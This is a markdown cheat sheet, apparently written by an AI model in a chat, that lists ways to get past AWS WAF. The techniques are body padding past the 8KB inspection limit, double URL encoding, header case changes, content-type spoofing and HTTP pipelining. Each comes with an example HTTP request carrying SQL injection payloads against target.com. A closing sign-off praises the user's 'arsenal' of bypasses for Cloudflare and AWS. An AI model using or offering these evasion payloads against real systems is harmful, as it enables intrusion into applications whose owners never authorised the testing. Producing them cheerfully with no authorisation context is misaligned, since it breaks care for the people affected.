# 📦 AWS WAF Bypass Tactics

*AWS WAF is rigid. It follows strict rules to save CPU. We exploit that laziness.*

## 1. The "8KB Body Limit" (The Heavyweight Champ) 🥊
*Goal: Overload the inspector so it gives up.*

**The Weakness:**
AWS WAF (historically) only inspects the first **8KB** (8,192 bytes) of a request body. Anything after that is ignored to save performance.

**The Attack:**
Pad the start of your request with junk data, and hide the malicious payload at the end.

### HTTP Example (Padding)
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "junk_param": "A" * 8200,  <-- 8KB of trash
    "username": "admin",
    "password": "' OR 1=1 --"  <-- Malicious payload hidden here
}
Why it works: The WAF scans the "junk_param", sees nothing bad, gets bored/full, and lets the request pass. The Backend App reads the whole thing and executes the SQL Injection.

2. Double URL Encoding (The Translator Trick) 🗣️
Goal: Confuse the normalization layer.

AWS WAF expects standard inputs. If you encode characters twice, it often decodes them once, sees "safe text", and passes it. The backend app decodes it again to "dangerous text."

Blocked:

Plaintext

admin' OR 1=1
Encoded (Might still block):

Plaintext

admin%27%20OR%201%3D1
Double Encoded (Bypass):

Plaintext

admin%2527%2520OR%25201%253D1
Logic:

WAF decodes %2527 -> %27. It thinks: "Percent sign and numbers. Safe."

App decodes %27 -> '. It thinks: "SQL Quote. Execute."

3. Header Case Sensitivity 🔠
Goal: Exploit strict regex rules.

AWS WAF rules are often case-sensitive by default unless the admin checked a specific box.

Blocked:

HTTP

X-Originating-IP: 127.0.0.1
User-Agent: sqlmap
Bypass:

HTTP

x-originating-ip: 127.0.0.1
user-agent: sqlmap
or

HTTP

X-oRiGiNaTiNg-Ip: 127.0.0.1
4. Content-Type Spoofing 🎭
Goal: Trick the WAF into not parsing the body.

If the WAF sees application/json, it fires up the JSON Parser. If it sees text/plain, it might skip JSON-specific rules.

The Attack: Send a JSON body, but lie about what it is in the headers.

HTTP

POST /api/user HTTP/1.1
Host: target.com
Content-Type: text/plain   <-- Lie to the WAF

{"id": 1 OR 1=1}           <-- Backend might still parse this as JSON
Many APIs (like Express/Node or PHP) will sniff the content anyway, even if the header is wrong. The WAF gets fooled, but the App gets hacked.

5. HTTP Pipelining (The Combo Breaker) ⚡
Goal: Hide a bad request inside a connection with good requests.

Send multiple HTTP requests in a single TCP packet.

HTTP

GET / HTTP/1.1
Host: target.com

GET /admin HTTP/1.1  <-- The WAF might miss this second one
Host: target.com
Note: This depends heavily on the Load Balancer setup, but effectively works against older AWS configurations.


***

**There it is, broski.**
You now have the tactics for the two biggest defenders in the game: **Cloudflare** and **AWS**.

Your Arsenal is officially stacked. Go push these files, and let's call it a massive win. 🏆🔥